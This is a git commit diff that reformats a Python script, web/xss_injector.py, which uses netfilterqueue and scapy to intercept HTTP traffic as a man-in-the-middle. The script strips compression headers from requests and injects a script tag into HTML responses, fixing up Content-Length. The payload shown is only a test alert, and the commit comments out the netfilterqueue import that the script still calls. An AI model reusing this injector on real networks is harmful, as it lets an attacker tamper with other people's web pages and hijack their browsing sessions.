3f464877c732425b97e93aa10ea2bac7d9db9d85
kadirbelkuyu <kadirbelkuyu@gmail.com>
2021-08-01 15:03:43 +0300

    queue edit

--- web/xss_injector.py
+++ web/xss_injector.py
@@ -1,9 +1,10 @@
-import netfilterqueue
+#import netfilterqueue
 import scapy.all as scpy
 import re
 
-def SetLoad (packet, load):
-    packet[scpy.Raw].load=load
+
+def SetLoad(packet, load):
+    packet[scpy.Raw].load = load
     if "allert('test')" in packet[scpy.Raw].load:
         print(packet[scpy.Raw].load)
         print("JS Injected Successfully")
@@ -12,32 +13,34 @@ def SetLoad (packet, load):
     del packet[scpy.TCP].chksum
     return packet
 
+
 def ProcessPack(packet):
     scpy_packet = scpy.IP(packet.get_payload())
     if scpy_packet.haslayer(scpy.Raw):
-        load=scpy_packet[scpy.Raw].load
+        load = scpy_packet[scpy.Raw].load
 
         if scpy_packet[scpy.TCP].dport == 80:
-            #print "[+]Request "
-            load = re.sub("Accept-Encoding:.*?\\r\\n", "",load)
+            # print "[+]Request "
+            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
 
         elif scpy_packet[scpy.TCP].sport == 80:
-            #print "[+] Response "
-            injection_code="<script>alert('test');</script>"
-            load=load.replace("</body>",injection_code+"</body>")
-            content_length_search = re.search("(?:Content-Length:\s)(\d*)",load)
+            # print "[+] Response "
+            injection_code = "<script>alert('test');</script>"
+            load = load.replace("</body>", injection_code + "</body>")
+            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
 
             if content_length_search and "text/html" in load:
-                content_length=content_length_search.group(1)
-                new_content_length=int(content_length)+len(injection_code)
-                load = load.replace(content_length,str(new_content_length))
+                content_length = content_length_search.group(1)
+                new_content_length = int(content_length) + len(injection_code)
+                load = load.replace(content_length, str(new_content_length))
 
         if load != scpy_packet[scpy.Raw].load:
-            new_packet=SetLoad(scpy_packet,load)
+            new_packet = SetLoad(scpy_packet, load)
             packet.set_payload(str(new_packet))
 
     packet.accept()
 
-queue=netfilterqueue.NetfilterQueue()
-queue.bind(0,ProcessPack)
-queue.run()
+
+q = netfilterqueue.NetfilterQueue()
+q.bind(0, ProcessPack)
+q.run()
